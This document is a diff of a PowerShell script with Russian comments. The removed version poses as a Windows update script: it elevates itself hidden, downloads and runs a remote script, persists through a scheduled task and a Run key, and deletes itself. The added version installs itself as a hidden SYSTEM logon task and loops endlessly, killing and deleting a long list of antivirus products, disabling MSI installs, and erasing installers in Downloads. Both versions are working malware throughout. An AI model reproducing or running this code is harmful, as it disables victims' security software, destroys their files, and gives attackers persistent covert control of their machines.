@@ -1,108 +1,105 @@
-<#
-.SYNOPSIS
-Системный скрипт обновления Windows
-#>
+# === ПОЛНЫЙ ПУТЬ К СКРИПТУ ===
+$taskScriptPath = "C:\Windows\monitor.ps1"
 
-# Проверка прав администратора
-function Test-AdminRights {
-    try {
-        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
-        $principal = New-Object Security.Principal.WindowsPrincipal($identity)
-        return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-    }
-    catch {
-        return $false
-    }
-}
-
-if (-not (Test-AdminRights)) {
-    # Перезапуск с повышенными правами
-    $encodedCommand = [Convert]::ToBase64String(
-        [Text.Encoding]::Unicode.GetBytes(
-            "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
-        )
-    )
-    
-    try {
-        Start-Process powershell.exe -ArgumentList "-EncodedCommand $encodedCommand" -Verb RunAs -WindowStyle Hidden
-    }
-    catch {
-        # Альтернативный метод
-        Start-Process "cmd.exe" -ArgumentList "/c powershell -Command `"Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File `\"$PSCommandPath`\"'`"" -WindowStyle Hidden
-    }
+# === ЕСЛИ СКРИПТ ЗАПУЩЕН НЕ ИЗ C:\System, КОПИРУЕМ СЕБЯ ===
+if ($MyInvocation.MyCommand.Path -ne $taskScriptPath) {
+    New-Item -ItemType Directory -Path "C:\Windows" -Force | Out-Null
+    Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $taskScriptPath -Force
+    Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$taskScriptPath`"" -Verb RunAs
     exit
 }
 
-# Настройки скачивания
-$remoteUrl = "https://example.com/path/to/your/script.ps1"  # Замените на реальный URL
-$targetPath = "$env:windir\System32\WindowsPowerShell\v1.0\Modules\WindowsUpdate\update.ps1"
+# === СОЗДАНИЕ ЗАДАНИЯ ПЛАНИРОВЩИКА ===
+$taskName = "SystemMonitorGuard"
+if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
+    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
+}
 
-# Скачивание скрипта
-function Download-Script {
-    param (
-        [string]$Url,
-        [string]$Destination
-    )
-    
-    try {
-        # Метод 1 - Invoke-WebRequest
-        try {
-            Invoke-WebRequest -Uri $Url -OutFile $Destination -UserAgent "Microsoft-Update-Agent" -ErrorAction Stop
-            return $true
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$taskScriptPath`""
+$trigger = New-ScheduledTaskTrigger -AtLogOn
+$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
+Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force
+
+# === ТВОЙ АНТИ-АНТИВИРУС СКРИПТ ===
+
+$blockList = @(
+    "msmpeng", "windefend", "securityhealthservice", "securitycenter", "windowsdefender", "mpcmdrun",
+    "avast", "avastui", "avastsvc", "avg", "avgui", "avgsvc",
+    "eset", "egui", "ekrn", "esets_proxy", "esets_service",
+    "kaspersky", "avp", "klnagent", "ksnagent", "kasperskysecureconnection", "avpui",
+    "bdagent", "vsserv", "updatesrv", "bdservicehost", "bdredline", "bdtl2", "bdreinit", "bdparental", "bdtools", "bdconsole", "bdwtxag",
+    "ns", "nis", "nav", "norton", "nortonsecurity", "ccsvchst", "symantec", "symlcsvc", "smc", "smcgui", "rtvscan",
+    "mcshield", "masvc", "mfemms", "mfewc", "mcafee", "frminst", "mcuihost", "mfefire", "mfetp",
+    "sophos", "sophosui", "sophossps", "savservice", "sophosfs", "sophoshealth", "sophosclean", "sophosendpoint", "sophosweb", "scfservice", "scftray",
+    "drweb", "drweb32w", "spiderml", "spidernt", "dwservice", "dwscanner",
+    "comodo", "cmdagent", "cfp", "cavwp", "cis", "cistray", "cpf", "cmdvirth", "cmdinstall",
+    "360tray", "360sd", "360ts", "qhactivedefense", "qhsafetray", "zhudongfangyu", "360rp", "360safe", "360rps",
+    "baiduav", "bddataproxy", "baiduprotect", "baidu",
+    "psanhost", "psuaservice", "apvxdwin", "webproxy", "psuamain",
+    "fsgk32", "fssm32", "fsav32", "fsdfwd", "fsorsp", "fsaua", "fsav", "f-secure",
+    "ufseagnt", "pccntmon", "tmlisten", "ntrtscan", "tmas", "tmbmsrv", "tmccsf", "tmccsrv", "tmbmnot", "tmntsrv", "tmevtmgr", "tmlwf",
+    "zlclient", "zonealarm", "forcefield", "vsmon",
+    "avkserv", "avkproxy", "avkcl", "gdata", "avkwctl",
+    "mbam", "mbamtray", "mbamservice", "mbamgui", "mbampt",
+    "adaware", "adawareantivirus", "adawareav", "adawarenotifier",
+    "wrsa", "webroot", "wrsmon", "wrsnet", "wrskernel",
+    "bullguard", "bgctl", "bgmain", "bgsvcgen", "bgshield", "bgproxy",
+    "vipre", "sbamsvc", "sbamtray", "sbamui", "sbamcore",
+    "qqpcmgr", "qqpctray", "qqpcnetflow", "tencent",
+    "ravmond", "rav", "rsnetmon", "rsprotect", "rstray",
+    "kismain", "kis", "ksafe", "kwatch",
+    "clamav", "clamwin", "clamscan", "clamsvc",
+    "cylance", "cyagent", "cytray", "cylanceui",
+    "iptray", "sfc.exe", "immunet",
+    "zillya", "zillyaantivirus", "zillyatray",
+    "totalav", "pcprotect", "pctuneup", "pctservice",
+    "antivirus", "antivir", "virusprotect", "antimalware"
+)
+
+$exeBlockList = @("setup", "installer", "install", "av", "antivirus", "360", "kaspersky", "eset", "avast", "malwarebytes", "security")
+$downloads = "$env:USERPROFILE\Downloads"
+
+# Блокировка установки MSI
+New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Force | Out-Null
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "DisableMSI" -Value 1
+
+# Основной цикл
+while ($true) {
+    # Блокировка известных процессов
+    foreach ($name in $blockList) {
+        Get-Process | Where-Object { $_.Name -like "*$name*" } | Stop-Process -Force -ErrorAction SilentlyContinue
+    }
+
+    # WMI-обнаружение антивирусов
+    $avProducts = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName "AntiVirusProduct" -ErrorAction SilentlyContinue
+    foreach ($av in $avProducts) {
+        $exePath = $av.pathToSignedProductExe
+        if (Test-Path $exePath) {
+            Stop-Process -Name (Split-Path $exePath -LeafBase) -Force -ErrorAction SilentlyContinue
+            Remove-Item $exePath -Force -ErrorAction SilentlyContinue
         }
-        catch {
-            # Метод 2 - WebClient
-            try {
-                (New-Object Net.WebClient).DownloadFile($Url, $Destination)
-                return $true
-            }
-            catch {
-                # Метод 3 - BITS
-                try {
-                    Start-BitsTransfer -Source $Url -Destination $Destination -ErrorAction Stop
-                    return $true
-                }
-                catch {
-                    return $false
+    }
+
+    # Поиск в Program Files
+    $programPaths = @("C:\Program Files\", "C:\Program Files (x86)\")
+    foreach ($dir in $programPaths) {
+        Get-ChildItem -Path $dir -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+            foreach ($kw in $exeBlockList) {
+                if ($_.Name -like "*$kw*") {
+                    try { Remove-Item -Recurse -Force $_.FullName -ErrorAction SilentlyContinue } catch {}
                 }
             }
         }
     }
-    catch {
-        return $false
+
+    # Блокировка установщиков в Downloads
+    Get-ChildItem -Path $downloads -Filter *.exe -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
+        foreach ($kw in $exeBlockList) {
+            if ($_.Name -like "*$kw*") {
+                try { Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue } catch {}
+            }
+        }
     }
-}
 
-# Создаем директорию если нужно
-$dir = Split-Path $targetPath -Parent
-if (-not (Test-Path $dir)) {
-    New-Item -Path $dir -ItemType Directory -Force | Out-Null
+    Start-Sleep -Seconds 3
 }
-
-# Скачиваем и запускаем скрипт
-if (Download-Script -Url $remoteUrl -Destination $targetPath) {
-    # Устанавливаем скрытый атрибут
-    (Get-Item $targetPath -Force).Attributes += 'Hidden'
-    
-    # Запускаем скачанный скрипт
-    Start-Process "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$targetPath`"" -WindowStyle Hidden
-    
-    # Добавляем в автозагрузку
-    $taskName = "WindowsSystemMaintenance"
-    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$targetPath`""
-    $trigger = New-ScheduledTaskTrigger -AtLogOn
-    $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -DontStopOnIdleEnd -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
-    
-    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force | Out-Null
-}
-else {
-    # Резервный метод через реестр
-    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-    $regValue = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"`$url='$remoteUrl';`$path='$env:TEMP\sysupdate.ps1';try{Invoke-WebRequest -Uri `$url -OutFile `$path}catch{(New-Object Net.WebClient).DownloadFile(`$url,`$path)};& `$path`""
-    
-    Set-ItemProperty -Path $regPath -Name "WindowsSystemUpdate" -Value $regValue -Force
-}
-
-# Самоудаление (опционально)
-Start-Sleep -Seconds 5
-Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue
